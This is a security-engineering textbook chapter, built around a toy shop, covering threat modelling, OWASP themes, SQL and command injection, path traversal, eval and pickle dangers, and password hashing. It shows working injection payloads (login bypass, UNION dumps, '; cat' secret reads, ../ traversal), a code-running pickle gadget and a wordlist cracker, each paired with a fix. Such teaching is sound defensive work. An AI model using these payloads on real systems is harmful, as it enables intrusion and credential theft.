Senior Engineering 3:
Security Engineering

Security bugs are ordinary bugs with an adversary attached. Someone is trying to make your program do something you never intended, and they only need to find one gap. This chapter teaches you to think from the attacker's side first, then close each gap with code you can test. Every attack in it runs safely against toy data inside your browser: an in-memory database, made-up tokens, pretend servers. Nothing here touches a real system.

3.1 — Think Like an Attacker: Assets, Trust Boundaries and STRIDE

A team ships a new button: Download my invoice. It works. Nobody is asked, before it ships, what an attacker could do with it. Two weeks later a customer notices that changing the number in the address bar shows a stranger's invoice. The code had no typo. What was missing was a threat model: a short, structured conversation about what could go wrong, held while changes are still cheap.

Security engineering starts with a change of viewpoint. When you build a feature you ask, "how does this work when people use it as intended?" When you attack it you ask, "what can I make it do that nobody intended?" A senior engineer asks both questions, in that order, before writing much code. Throughout this chapter we use a made-up online shop called Corner Shop. Its customers are Asha and Chen, its administrator is Ben, and everything runs on toy data inside your browser.

Assets, attackers and trust boundaries

An asset is anything worth protecting: customer emails, password hashes, the ability to issue refunds, even the shop being online at all. An attacker is anyone who would benefit from misusing an asset. It might be a stranger on the internet, a customer curious about other customers, or a former employee. You do not need to guess their names. You need to guess what they want and what they can reach.

A trust boundary is a line in your system where data moves from a place you control less to a place you control more. A browser is outside your control, because anyone can edit what it sends. The API server is inside. The database is deeper inside. Whenever data crosses a boundary, it must be checked, because the party on the other side might be lying. Think of an airport: the check-in hall is open to anyone, but you must show a ticket and pass a scan before you reach the gates. Each boundary is a checkpoint.

The diagram is a data flow diagram: boxes for processes and stores, arrows for data moving, and vertical lines for trust boundaries. Attackers care about the arrows that cross a line. That is where they can inject, forge, or replay something. The snippet below writes the shop's flows as plain data and finds the crossings automatically.

Find the arrows that cross a trust boundary
ZONES = {"browser": "internet", "api": "our servers", "database": "our servers", "payments": "partner"} FLOWS = [ ("browser", "api", "login form: email and password"), ("browser", "api", "order request: item ids and coupon"), ("api", "database", "SQL: read and write orders"), ("api", "payments", "charge request: amount and token"), ] def crossings(flows, zones): found = [] for src, dst, what in flows: if zones[src] != zones[dst]: found.append((src, dst, what)) return found for src, dst, what in crossings(FLOWS, ZONES): print(f"{src} -> {dst}: {what}") print("crossings:", len(crossings(FLOWS, ZONES)), "of", len(FLOWS))
browser -> api: login form: email and password browser -> api: order request: item ids and coupon api -> payments: charge request: amount and token crossings: 3 of 4

What Python does, line by line

  • ZONES maps every box to the zone it lives in. Two boxes in the same zone (api and database) do not cross a boundary in this simple model.
  • FLOWS lists each arrow as (from, to, what travels).
  • crossings walks the arrows and keeps those whose two ends sit in different zones.
  • Three of four arrows cross. The api-to-database arrow does not, but it is still dangerous, as the next section shows: what the API builds from untrusted input decides what the database does.

STRIDE: six questions to ask at every crossing

Once you know where the boundaries are, you need a checklist so you do not rely on inspiration. STRIDE is a mnemonic from Microsoft that names six kinds of threat. Each one breaks a specific security property, which tells you what kind of defence to reach for.

Rank the risks, then decide

A long list of threats is not a plan. Risk is how likely something is multiplied by how much it would hurt. Score both on a small scale, multiply, sort, and fix the top of the list first. For each threat you then choose one response: mitigate (add a control), accept (decide the cost is fine and write down who agreed), transfer (buy insurance or use a provider), or avoid (remove the feature). "We did not think about it" is not one of the choices.

A tiny risk register that sorts itself
risks = [ {"id": "R1", "threat": "guess Asha's password", "likelihood": 5, "impact": 4, "fix": None}, {"id": "R2", "threat": "read another customer's invoice", "likelihood": 4, "impact": 4, "fix": None}, {"id": "R3", "threat": "flood the login page", "likelihood": 3, "impact": 2, "fix": "rate limit"}, {"id": "R4", "threat": "steal the admin key from git", "likelihood": 2, "impact": 5, "fix": "vault"}, ] for r in risks: r["score"] = r["likelihood"] * r["impact"] for r in sorted(risks, key=lambda r: -r["score"]): status = "OPEN" if r["fix"] is None else "planned: " + r["fix"] print(f'{r["id"]} score={r["score"]:>2} {r["threat"]:<34} {status}') open_items = [r["id"] for r in risks if r["fix"] is None] print("still open:", open_items)
R1 score=20 guess Asha's password OPEN R2 score=16 read another customer's invoice OPEN R4 score=10 steal the admin key from git planned: vault R3 score= 6 flood the login page planned: rate limit still open: ['R1', 'R2']

Notice that R1 and R2 have no fix yet and rank highest. That is exactly the point of the register: it makes the uncomfortable rows impossible to overlook. A threat model is a living document. You update it when the design changes, for example when the shop adds a mobile app or a new payment partner.

Common mistake: modelling a flow that does not exist

Threat models rot quietly. Someone renames a component, someone adds a flow and forgets to draw it, and the model no longer matches reality. When our data-driven model refers to a box it never declared, Python tells us immediately:

A flow that names an undeclared box
ZONES = {"browser": "internet", "api": "our servers"} flow = ("api", "cache", "session lookup") try: crossed = ZONES[flow[0]] != ZONES[flow[1]] except KeyError as e: print("KeyError:", e) print("The model does not know the box", e, "- add it to ZONES, with a zone.")
KeyError: 'cache' The model does not know the box 'cache' - add it to ZONES, with a zone.

Read the message like this: KeyError: 'cache' means "the dictionary has no entry named cache". The fix is to add the box and decide which zone it lives in. That decision is itself a security decision: a cache holding session tokens deserves the same protection as the database.

Check yourself: Is the arrow from the API to the database inside or outside a trust boundary in the diagram above, and why might it still be dangerous?
Inside our servers, so no boundary is crossed. It is still dangerous because the API builds the query from data that did cross a boundary earlier (the browser). Untrusted input can ride along inside a trusted arrow. The next sections show how.

Recap
  • A threat model lists assets, attackers, data flows and trust boundaries, then asks what could go wrong at each crossing.
  • STRIDE gives six prompts: spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege.
  • Risk is likelihood times impact; sort, fix the top, and record every accepted risk with a name and date.
  • Untrusted data can ride inside a trusted arrow, so inspect what your code builds from it.
3.2 — The OWASP Top 10 in Practical Terms

Ben, the Corner Shop administrator, asks a fair question: "There are thousands of ways to write an insecure program. Where do we start?" The answer most teams use is the OWASP Top 10, a list published by the Open Worldwide Application Security Project. It ranks the most common and most damaging web application risks, based on data from real breaches and real security reviews. It is a map, not a checklist you tick once. The names and order change between editions (2021 and a later refresh), but the themes are stable, so learn the themes.

Here is the list in practical terms. The right-hand column says where this chapter teaches the defence.

The diagram shows a useful habit: for any request, walk left to right and ask which theme could bite at each stage. Defence in depth means several stages each catch what the previous one missed.

A first look for danger: reading code like an attacker

Attackers search code for known-bad patterns, because searching is cheaper than thinking. You can do the same to your own code. The snippet below is a toy static analyser: it scans source text with regular expressions (patterns that match text) and labels each hit with a theme. Real tools such as Bandit and Semgrep are far smarter, but the idea is the same. The code being scanned is a string: it is never executed.

A toy scanner that flags risky lines
import re RULES = [ (r"execute\(f[\"']", "injection: query built with an f-string"), (r"\beval\(", "injection: eval of data"), (r"md5|sha1\(", "crypto: weak hash"), (r"verify\s*=\s*False", "crypto: TLS check disabled"), (r"DEBUG\s*=\s*True", "misconfiguration: debug on"), (r"password\s*=\s*[\"'][^\"']+[\"']", "secret: hard-coded password"), ] SOURCE = """\ def login(db, email): return db.execute(f"SELECT * FROM users WHERE email = '{email}'") DEBUG = True ADMIN_PASSWORD = "hunter2" h = md5(pw) """ for lineno, line in enumerate(SOURCE.splitlines(), 1): for pattern, label in RULES: if re.search(pattern, line, re.IGNORECASE): print(f"line {lineno}: {label}")
line 2: injection: query built with an f-string line 3: misconfiguration: debug on line 4: secret: hard-coded password line 5: crypto: weak hash

What Python does, line by line

  • RULES pairs a regular expression with a label. \b means "word boundary" and \s* means "any spaces".
  • SOURCE is a triple-quoted string that stands in for a file. We only read it.
  • For each line, every rule is tried with re.search. A match prints the line number and the label.
  • Four lines are flagged. The md5 call and the hard-coded password are found by pattern alone; a human decides whether each is a real problem.

Pattern scanners produce false positives (a flag on something harmless) and false negatives (a real bug with a shape the rules do not know). Both are normal. Treat a scanner as a fast first pair of eyes and never as proof of safety.

Misconfiguration and failing safely

Many breaches involve no bug at all, only a setting: a database open to the internet, a default password left in place. A cheap defence is a configuration linter, a small function that reads your settings and complains before deployment.

Lint a settings dictionary before it ships
def lint(config): problems = [] if config.get("debug"): problems.append("debug is on: error pages leak internals") if config.get("admin_password") in ("admin", "password", "changeme", ""): problems.append("default or empty admin password") if "*" in config.get("cors_origins", []): problems.append("CORS allows every origin") if not config.get("session_cookie_secure", False): problems.append("session cookie can travel over plain http") return problems prod = {"debug": True, "admin_password": "changeme", "cors_origins": ["*"], "session_cookie_secure": False} for p in lint(prod): print("FIX:", p) print("clean config ->", lint({"debug": False, "admin_password": "x9!Lq2", "cors_origins": ["https://shop.example"], "session_cookie_secure": True}))
FIX: debug is on: error pages leak internals FIX: default or empty admin password FIX: CORS allows every origin FIX: session cookie can travel over plain http clean config -> []

The second theme in this section is failing safely. When something goes wrong (a database timeout, a broken permission service), does your code allow or deny? A system that allows on error is fail-open. An attacker will try to cause the error. The safe default is fail-closed: if you cannot prove the request is allowed, refuse it.

Fail-open versus fail-closed authorization
def permission_service(user): raise TimeoutError("permission service unavailable") def can_refund_open(user): try: return permission_service(user) except Exception: return True # "let them through, we are busy" (vulnerable) def can_refund_closed(user): try: return permission_service(user) except Exception: return False # cannot prove it, so deny print("fail-open ->", can_refund_open("asha")) print("fail-closed->", can_refund_closed("asha"))
fail-open -> True fail-closed-> False

Common mistake: a broken pattern

When you write your own scanner rule, a stray bracket is easy to leave in. Python reports it precisely:

A regular expression with a missing bracket
import re try: re.compile(r"password\s*=\s*[\"']([^\"']+") except re.error as e: print("re.error:", e)
re.error: missing ), unterminated subpattern at position 20

The message points at the unclosed group (a "(" with no matching ")"). Count your brackets, or test each rule against one sample line before adding it to the list.

Check yourself: Why does "Broken access control" lead the list even though it is one of the simplest bugs?
Because every endpoint and every object needs its own check, so there are many places to forget one, and one forgotten check exposes real data. Simple is not the same as rare.
Check yourself: A scanner reports nothing on your code. What can you conclude?
Only that none of its rules matched. Logic bugs such as a missing ownership check have no telltale text, so you still need review and tests.

Recap
  • The OWASP Top 10 is a ranked map of common web risks; learn the themes, since names and order change by edition.
  • Read each request left to right and ask which theme could bite at each stage.
  • Scanners find patterns quickly but have false positives and false negatives; review and tests still matter.
  • Fail closed: when you cannot prove access is allowed, deny it.
3.3 — Injection I: SQL Injection, Exploit and Fix

Imagine you are the attacker and Corner Shop has a login form. You cannot see the code. You can only type into two boxes. What would you try? You would type something the programmer did not expect, and watch what comes back. A stray apostrophe is the classic first probe, because in SQL an apostrophe marks the end of a piece of text. If the page crashes or behaves oddly, the input is being glued into a query. That is SQL injection: untrusted text is mixed into a database command, and the database cannot tell which part you meant as data and which part is code.

Why string building is dangerous: code and data share one channel
  Developer intends:   SELECT ... WHERE email = ' [ data: asha@shop.example ] '
                                                 ^^^^ data stays inside the quotes

  Attacker sends:      nobody' OR '1'='1' --
                              ^ quote closes the data early; "OR ..." is now CODE

  Resulting text:      SELECT ... WHERE email = 'nobody' OR '1'='1' --' AND pw = '...'
                                                          always true      rest ignored (comment)

  Parameterized:       SQL text with a ? hole   +   values sent separately
                       [ code, compiled first ]     [ data, never parsed as SQL ]

Everything here runs against sqlite3, the small database built into Python, using :memory:, which means a database that lives only in RAM and disappears when the program ends. The table holds three toy users. Their "passwords" are made-up strings so we can see what leaks; Section 3.5 explains why real systems never store them like this.

The vulnerable code and the exploit

A login built with an f-string, and three attempts
import sqlite3 db = sqlite3.connect(":memory:") db.executescript("""CREATE TABLE users(id INTEGER PRIMARY KEY, email TEXT, pw TEXT, role TEXT); INSERT INTO users VALUES (1,'asha@shop.example','pw-asha','customer'), (2,'ben@shop.example','pw-ben','admin'), (3,'chen@shop.example','pw-chen','customer');""") def login_vulnerable(email, pw): sql = f"SELECT id, email, role FROM users WHERE email = '{email}' AND pw = '{pw}'" print("SQL sent:", sql) return db.execute(sql).fetchall() print(login_vulnerable("asha@shop.example", "pw-asha")) print(login_vulnerable("asha@shop.example", "wrong")) print(login_vulnerable("ben@shop.example' --", "no idea"))
SQL sent: SELECT id, email, role FROM users WHERE email = 'asha@shop.example' AND pw = 'pw-asha' [(1, 'asha@shop.example', 'customer')] SQL sent: SELECT id, email, role FROM users WHERE email = 'asha@shop.example' AND pw = 'wrong' [] SQL sent: SELECT id, email, role FROM users WHERE email = 'ben@shop.example' --' AND pw = 'no idea' [(2, 'ben@shop.example', 'admin')]

What Python does, line by line

  • executescript creates the table and inserts three rows. Nothing is stored on disk.
  • login_vulnerable builds the query with an f-string. Whatever the visitor typed is pasted into the text.
  • Call one is a normal login: one row matches. Call two has the wrong password: no rows, so login fails, as designed.
  • Call three types an apostrophe to close the email early, then --, which starts an SQL comment. The database ignores the password check entirely and returns Ben, the administrator.

The attacker did not guess a password or break any encryption. The program itself changed the meaning of the query. Notice the printed SQL: it shows exactly what the database received, and that printed text is the first thing to look at whenever you debug an injection.

Reading data that was never meant to be shown

Login bypass is the famous case, but UNION injection is more damaging. SQL's UNION glues the results of two queries into one list. If a search box is injectable, the attacker asks the database to append rows from any table they like. They only need to match the number of columns.

A product search that leaks the users table
import sqlite3 db = sqlite3.connect(":memory:") db.executescript("""CREATE TABLE users(id INTEGER PRIMARY KEY, email TEXT, pw TEXT, role TEXT); INSERT INTO users VALUES (1,'asha@shop.example','pw-asha','customer'),(2,'ben@shop.example','pw-ben','admin'); CREATE TABLE products(id INTEGER PRIMARY KEY, name TEXT, price REAL); INSERT INTO products VALUES (1,'tea',4.5),(2,'mug',9.0),(3,'kettle',30.0);""") def search_vulnerable(q): return db.execute(f"SELECT name, price FROM products WHERE name LIKE '%{q}%'").fetchall() print("normal :", search_vulnerable("mug")) payload = "zzz' UNION SELECT email, pw FROM users --" print("attack :", search_vulnerable(payload))
normal : [('mug', 9.0)] attack : [('asha@shop.example', 'pw-asha'), ('ben@shop.example', 'pw-ben')]

The first half of the query finds nothing called "zzz". The second half, supplied by the attacker, returns every email with its password in the "price" column. The page shows it as if it were a product list. Real attackers automate this with tools, and a single injectable field can expose an entire database.

Common mistake: the apostrophe that crashes the page

Often the first sign of an injectable field is not an attack at all but an honest customer named O'Brien whose search fails. If you ever see this error in production, treat it as a security bug, not just a data bug:

An innocent apostrophe breaks the query
import sqlite3 db = sqlite3.connect(":memory:") db.execute("CREATE TABLE products(name TEXT, price REAL)") try: db.execute(f"SELECT name FROM products WHERE name LIKE '%{'O' + chr(39) + 'Brien'}%'") except sqlite3.OperationalError as e: print("OperationalError:", e)
OperationalError: near "Brien": syntax error

Read it as: OperationalError: near "Brien": syntax error means the database saw the apostrophe as the end of the text and then met the word Brien where it expected SQL. If the input can break the query, a cleverer input can rewrite it.

The fix: parameterized queries

The fix is not to filter dangerous characters. Filters are fragile: attackers find spellings you did not think of. The fix is to keep code and data in separate channels. With a parameterized query (also called a prepared statement) you write the SQL once with placeholders (? in sqlite) and hand the values over separately. The database compiles the statement first, so a value can never become code. Think of a form with blank lines: whatever you write in the blank stays text, even if you write "ignore the form" in it.

The same three attacks, now harmless
import sqlite3 db = sqlite3.connect(":memory:") db.executescript("""CREATE TABLE users(id INTEGER PRIMARY KEY, email TEXT, pw TEXT, role TEXT); INSERT INTO users VALUES (1,'asha@shop.example','pw-asha','customer'),(2,'ben@shop.example','pw-ben','admin'); CREATE TABLE products(id INTEGER PRIMARY KEY, name TEXT, price REAL); INSERT INTO products VALUES (1,'tea',4.5),(2,'O' || char(39) || 'Brien mug',9.0);""") def login_safe(email, pw): return db.execute("SELECT id, email, role FROM users WHERE email = ? AND pw = ?", (email, pw)).fetchall() def search_safe(q): return db.execute("SELECT name, price FROM products WHERE name LIKE ?", (f"%{q}%",)).fetchall() print(login_safe("ben@shop.example' --", "no idea")) print(login_safe("ben@shop.example", "pw-ben")) print(search_safe("zzz' UNION SELECT email, pw FROM users --")) print(search_safe("O'Brien"))
[] [(2, 'ben@shop.example', 'admin')] [] [("O'Brien mug", 9.0)]

The attack payloads now return an empty list, because there is no product whose name literally contains that text. The honest O'Brien search works. One change removed the vulnerability and the crash. Notice the % wildcards are added to the value, not written into the SQL.

What placeholders cannot do: identifiers

You can parameterize values, but not table or column names, nor the ASC/DESC keyword. For a "sort by" option, use an allowlist: a fixed dictionary that maps user choices to fragments you wrote yourself.

Sort options through an allowlist
SORTS = {"price": "price ASC", "name": "name ASC", "expensive": "price DESC"} def build_query(sort_choice): order = SORTS.get(sort_choice, "name ASC") # unknown choice -> safe default return "SELECT name, price FROM products ORDER BY " + order print(build_query("expensive")) print(build_query("price; DROP TABLE users"))
SELECT name, price FROM products ORDER BY price DESC SELECT name, price FROM products ORDER BY name ASC

The second call shows the point: hostile input never reaches the query, because only strings that you wrote can be inserted. ORMs and query builders do this parameterizing for you, but nearly all have a "raw SQL" escape hatch, and that is where injections hide. Second-order injection deserves a mention too: a hostile value is stored safely, then later pasted into a different query without parameters. Parameterize every query, always, including ones that use data you already trust.

Write the regression test

A fix without a test is a fix that will quietly disappear in a refactor. Keep a list of hostile payloads and assert that the safe function returns nothing for every one.

A regression test with a payload list
import sqlite3 db = sqlite3.connect(":memory:") db.executescript("""CREATE TABLE users(id INTEGER PRIMARY KEY, email TEXT, pw TEXT, role TEXT); INSERT INTO users VALUES (1,'asha@shop.example','pw-asha','customer'),(2,'ben@shop.example','pw-ben','admin');""") def login_safe(email, pw): return db.execute("SELECT id FROM users WHERE email = ? AND pw = ?", (email, pw)).fetchall() PAYLOADS = ["' OR '1'='1", "ben@shop.example' --", "x' OR 1=1 --", "'; DROP TABLE users; --"] failures = [p for p in PAYLOADS if login_safe(p, "x")] print("payloads tried:", len(PAYLOADS), "| got through:", len(failures)) print("users table still has", db.execute("SELECT COUNT(*) FROM users").fetchone()[0], "rows") print("PASS" if not failures else "FAIL")
payloads tried: 4 | got through: 0 users table still has 2 rows PASS
Check yourself: Why is "remove apostrophes from the input" a weak fix?
It only blocks one way to end a text value. Numeric contexts (WHERE id = {x}) need no quote at all, and encodings, comments and other syntax offer more routes. Separating code from data removes the whole class instead of chasing spellings.
Check yourself: Can you parameterize the table name in SELECT * FROM {table}?
No. Placeholders stand for values only. Map the user's choice through an allowlist you wrote.

Recap
  • SQL injection happens when untrusted text is pasted into SQL, so data changes the query's meaning.
  • UNION injection turns any injectable field into a way to read other tables.
  • Fix by parameterizing every query; never rely on filtering or escaping quotes.
  • Identifiers and sort order cannot be parameters: use an allowlist. Keep payload regression tests.
3.4 — Injection II: Commands, Paths, eval and Pickle

SQL is only one language your program speaks. Every time you build a string in one language and hand it to another interpreter (a shell, a file system, Python itself), you have created an injection point. The attacker's question is always the same: can I make this text stop being data and start being an instruction? This section covers four more instances of that one idea.

A safety note before we start. Your browser cannot start real operating-system processes, and we would not want it to. Every demo below uses a toy shell written in Python that only reads a pretend file system stored in a dictionary. It shows what a real shell would parse, without running anything real.

Command injection

Corner Shop has an admin page "Check a supplier's server", where Ben types a host name. The developer writes os.system("ping -c 1 " + host). A real shell treats ;, &&, | and backticks as "here starts another command". So the host example.com; cat /etc/shop/secret.key runs the ping and then prints the secret. The toy shell below splits a line the same way and runs only pretend commands.

A toy shell shows what "; cat ..." does
import shlex FAKE_FS = {"/etc/shop/secret.key": "KEY-123-TOY"} def toy_shell(line): lex = shlex.shlex(line, posix=True, punctuation_chars=True) lex.whitespace_split = True cmds, cur = [], [] for tok in lex: if tok in (";", "&&", "||", "|", "&"): if cur: cmds.append(cur) cur = [] else: cur.append(tok) if cur: cmds.append(cur) for argv in cmds: if argv[0] == "ping": print(" ping ->", argv[-1], "is reachable") elif argv[0] == "cat": print(" cat ->", FAKE_FS.get(argv[1], "no such file")) else: print(" unknown command:", argv[0]) return cmds host = "example.com; cat /etc/shop/secret.key" cmds = toy_shell("ping -c 1 " + host) print("commands the shell saw:", len(cmds))
ping -> example.com is reachable cat -> KEY-123-TOY commands the shell saw: 2

Two commands ran where the developer expected one. The second one printed the secret. The fix has three layers. First, avoid the shell: pass a list of arguments so nothing is parsed (subprocess.run(["ping", "-c", "1", host]), which is the default when shell=False). Second, validate the input against a strict pattern of what a host name looks like. Third, if you must build a shell line, quote each piece with shlex.quote.

Quote, validate and reject leading dashes
import re, shlex def is_valid_host(host): # letters, digits, dots and dashes only; must not start with "-" (option injection) return re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9.-]{0,252}", host) is not None attacks = ["example.com; cat /etc/shop/secret.key", "-f", "$(whoami).example.com", "example.com"] for host in attacks: print(f"{host!r:45} valid={is_valid_host(host)} quoted={shlex.quote(host)}") argv = ["ping", "-c", "1", "--", "example.com"] print("argv list, no shell:", argv)
'example.com; cat /etc/shop/secret.key' valid=False quoted='example.com; cat /etc/shop/secret.key' '-f' valid=False quoted=-f '$(whoami).example.com' valid=False quoted='$(whoami).example.com' 'example.com' valid=True quoted=example.com argv list, no shell: ['ping', '-c', '1', '--', 'example.com']

Look at the quoted column: shlex.quote wraps anything suspicious in single quotes so a shell sees one word. Notice that -f comes back unquoted: it is a harmless word to a shell, so quoting cannot stop it being read as a flag. The list form is the strongest option because there is no shell to fool. The -- tells the program "no more options after this", which stops a value like -f from being taken as a flag. This is called option injection, and it works even when there is no shell at all.

Common mistake: quotes that never close

If you parse a line with shlex.split to inspect it, hostile input can throw an error. Handle it as "reject", never as "let it through".

A real error from shlex
import shlex try: shlex.split("ping 'example.com") except ValueError as e: print("ValueError:", e)
ValueError: No closing quotation

The message No closing quotation tells you the input has an opening quote and no matching one. Catch ValueError around parsing and return a "bad request" answer.

Path traversal

The same idea applies to file names. A "download your receipt" feature reads receipts/<name>.pdf. The attacker asks for ../../etc/shop/secret.key. Each .. means "go up one folder", so the path climbs out of the receipts folder. The safe pattern is: join, normalize (resolve the .. parts), then check the result still lives under the base folder.

Path traversal against a pretend disk, and the fix
import posixpath DISK = {"/srv/shop/receipts/asha-1.txt": "Receipt: 2 x tea", "/etc/shop/secret.key": "KEY-123-TOY"} BASE = "/srv/shop/receipts" def read_vulnerable(name): return DISK.get(posixpath.normpath(BASE + "/" + name), "not found") def read_safe(name): full = posixpath.normpath(posixpath.join(BASE, name)) if posixpath.commonpath([full, BASE]) != BASE: return "blocked: outside receipts folder" return DISK.get(full, "not found") attack = "../../../etc/shop/secret.key" print("vulnerable:", read_vulnerable(attack)) print("safe :", read_safe(attack)) print("safe, real:", read_safe("asha-1.txt"))
vulnerable: KEY-123-TOY safe : blocked: outside receipts folder safe, real: Receipt: 2 x tea

commonpath finds the longest folder both paths share. If the shared folder is not the base, the requested file is somewhere else and we refuse. A plain startswith(BASE) check is a classic bug: /srv/shop/receipts-private starts with the same characters as /srv/shop/receipts. Compare whole path segments, not text prefixes.

eval and deserialization

eval runs text as Python code. A developer wants a "quick calculator" for discount rules and writes eval(user_text). In real programs eval can reach the whole language, including files and processes. Here the toy stand-in for "everything else in the program" is a variable holding a made-up key.

eval leaks a variable; a tiny safe calculator does not
import ast, operator SECRET_API_KEY = "KEY-123-TOY" print("eval says :", eval("SECRET_API_KEY")) OPS = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv} def safe_calc(text): def walk(node): if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)): return node.value if isinstance(node, ast.BinOp) and type(node.op) in OPS: return OPS[type(node.op)](walk(node.left), walk(node.right)) raise ValueError("not allowed") return walk(ast.parse(text, mode="eval").body) print("safe_calc :", safe_calc("(10 + 5) * 2")) try: safe_calc("SECRET_API_KEY") except ValueError as e: print("ValueError:", e)
eval says : KEY-123-TOY safe_calc : 30 ValueError: not allowed

The safe version parses the text into a tree (the AST, abstract syntax tree) and evaluates only the node types we list: numbers and four operators. Anything else is refused. This is an allowlist again: define what is allowed, deny the rest. ast.literal_eval is a ready-made version for plain data literals such as lists and dictionaries.

Insecure deserialization is eval in disguise. Python's pickle format can tell the loader "call this function with these arguments" while reading. Never unpickle data from an untrusted source. Prefer JSON, which can only describe data.

Loading a pickle runs a function
import pickle class Trap: def __reduce__(self): return (print, ("this ran while loading the pickle!",)) blob = pickle.dumps(Trap()) print("about to load...") pickle.loads(blob) print("loaded.")
about to load... this ran while loading the pickle! loaded.

Loading the bytes called print, and it could have been any function the attacker chose. The blob looked like data. With JSON, json.loads can never call anything. If you need to trust a file, sign it (Section 3.8) and verify the signature before parsing.

Check yourself: Why is subprocess.run(["ping", host]) safer than os.system("ping " + host)?
With a list and no shell, the host is one argument to ping: ; and && have no special meaning. You should still validate the host and guard against a leading dash, because option injection needs no shell.
Check yourself: Why does startswith(BASE) fail as a path check?
It compares characters, not folders. /srv/shop/receipts-private/x starts with /srv/shop/receipts. Normalize the path first and compare whole segments, for example with commonpath.

Recap
  • Any time you build a string for another interpreter (shell, path, eval), untrusted text can become instructions.
  • Avoid the shell: pass argument lists; validate with a strict pattern; quote with shlex.quote as a last resort; use -- to stop option injection.
  • For paths: normalize, then check the result is inside the base folder by whole segments.
  • Never eval or unpickle untrusted data. Use an AST allowlist for expressions and JSON for data.
3.5 — Passwords I: Why Fast Hashes Fail

Suppose an attacker has already read the Corner Shop users table, perhaps through the SQL injection from Section 3.3, or from a stolen backup. Now the question is what they can do with it. If the table holds passwords, they can log in as everyone, and because people reuse passwords, they can log in to other sites as well. If the table holds hashes, the attacker has to work for each password. How much work depends entirely on how you hashed.

A hash function turns any input into a fixed-size fingerprint. Two properties matter here. It is one-way: you cannot run it backwards. And the same input always gives the same output. To check a login, you hash what the user typed and compare it with the stored fingerprint. You never need to store the password itself. But "one-way" does not mean "safe". An attacker cannot reverse the hash, but they can guess passwords, hash each guess, and see whether the fingerprint matches. Guessing is the whole game, and the defender's job is to make each guess expensive.

Four ways to store a password, weakest to strongest
  1  plain text        "pw-asha"                 -> attacker reads every password at once
  2  fast hash         sha256("pw-asha")         -> billions of guesses per second
  3  salted fast hash  sha256(salt + "pw-asha")  -> no shared tables, still fast to guess
  4  salted SLOW hash  scrypt / PBKDF2 / bcrypt / argon2 (salt, cost)
                                                -> each guess costs real time and memory

Attack 1: the unsalted fast hash

SHA-256 is an excellent hash for checking that a file was not corrupted. It is a poor choice for passwords, because it is designed to be fast, and fast is what a guessing attacker wants. Below, the "leaked" table stores unsalted SHA-256 hashes. The attacker hashes a small list of common passwords once, then looks every stolen fingerprint up in that table.

Cracking an unsalted table with a wordlist
import hashlib def fast_hash(pw): return hashlib.sha256(pw.encode()).hexdigest() leaked = {"asha": fast_hash("sunshine1"), "ben": fast_hash("k9#Tq!v2Lw"), "chen": fast_hash("sunshine1"), "dana": fast_hash("letmein")} wordlist = ["123456", "password", "letmein", "sunshine1", "qwerty"] lookup = {fast_hash(w): w for w in wordlist} # built once, reused for every user for user, h in leaked.items(): print(f"{user:5} {h[:12]}... ->", lookup.get(h, "not in wordlist")) print("asha and chen share a hash:", leaked["asha"] == leaked["chen"])
asha 284fff3bd254... -> sunshine1 ben 01eae61cb778... -> not in wordlist chen 284fff3bd254... -> sunshine1 dana 1c8bfe8f801d... -> letmein asha and chen share a hash: True

What Python does, line by line

  • fast_hash encodes the password to bytes, hashes it, and returns the 64-character hex fingerprint.
  • leaked is what the thief holds: user name to fingerprint. Asha and Chen chose the same password.
  • lookup is the attacker's precomputed table, called a rainbow-style table: fingerprint back to the guess that produced it. It is built once and works against every user and every site that used unsalted SHA-256.
  • Three of four users fall instantly. Ben's long random password survives because it is not in the list. Length and randomness help the user, but you cannot control what users choose, so the storage method must carry the weight.

Notice the last line of output too: identical hashes reveal identical passwords. Cracking one reveals every user who shares it.

Common mistake: hashing text instead of bytes

A hash function works on bytes, not on text. Forgetting to encode gives one of Python's clearest errors:

The bytes error
import hashlib try: hashlib.sha256("sunshine1") except TypeError as e: print("TypeError:", e) print(hashlib.sha256("sunshine1".encode()).hexdigest()[:16])
TypeError: Strings must be encoded before hashing 284fff3bd254b48c

Read it as "give me bytes". Call .encode() on the string (UTF-8 by default). This is a typing error, not a security bug, but it shows up in every first attempt.

Defence 1: a salt

A salt is a random value, unique to each user, stored beside the hash and mixed into the input. It is not secret. Its job is to make identical passwords produce different hashes, and to make a precomputed table worthless, because the attacker would need a separate table for every salt. Think of a salt as a personal seasoning: the same dish tastes different for each customer, so one recipe book of tasting notes cannot cover all of them.

The same password with two salts
import hashlib def salted(pw, salt): return hashlib.sha256(salt + pw.encode()).hexdigest() salt_a, salt_b = b"salt-for-asha", b"salt-for-chen" ha, hc = salted("sunshine1", salt_a), salted("sunshine1", salt_b) print("same password, same hash?", ha == hc) print("asha's stored record :", salt_a.decode(), ha[:12]) print("recompute at login :", salted("sunshine1", salt_a) == ha)
same password, same hash? False asha's stored record : salt-for-asha 951f8897b968 recompute at login : True

The precomputed table is now useless, but the attacker can still attack one user at a time: pick one salt, hash a wordlist with it, compare. That is where speed comes in.

Defence 2: make every guess slow

If a guess costs a microsecond, an attacker can try billions of guesses per second on rented graphics cards. If a guess costs a fifth of a second, they get five per second per machine. A password hashing function such as PBKDF2, scrypt, bcrypt or Argon2 repeats work on purpose, and some also demand memory, which graphics cards have little of per core. The number of repetitions is the cost factor, and you raise it as hardware improves. The arithmetic below uses round illustrative rates, not measurements of any real machine.

How long to try every 8-character lowercase-and-digit password
space = 36 ** 8 # 26 letters + 10 digits, 8 characters print(f"search space: {space:,} passwords") rates = {"plain sha256 (GPU farm)": 10_000_000_000, "salted sha256 (GPU farm)": 10_000_000_000, "slow hash, tuned cost": 20_000} for name, per_second in rates.items(): seconds = space / per_second print(f"{name:26} {seconds/3600:>12,.1f} hours ({seconds/86400/365:,.2f} years)")
search space: 2,821,109,907,456 passwords plain sha256 (GPU farm) 0.1 hours (0.00 years) salted sha256 (GPU farm) 0.1 hours (0.00 years) slow hash, tuned cost 39,182.1 hours (4.47 years)

The salt did not change the speed at all. It stopped table reuse. The slow hash multiplied the attacker's cost by a factor of hundreds of thousands. Both defences are needed, and neither replaces a decent password. Bcrypt and Argon2 are the usual recommendations when a library is available; the next section builds the same idea with the standard library's PBKDF2 and scrypt.

Check yourself: An attacker steals a table of salted SHA-256 hashes. Which is still true: identical passwords have different hashes, or guessing is slow?
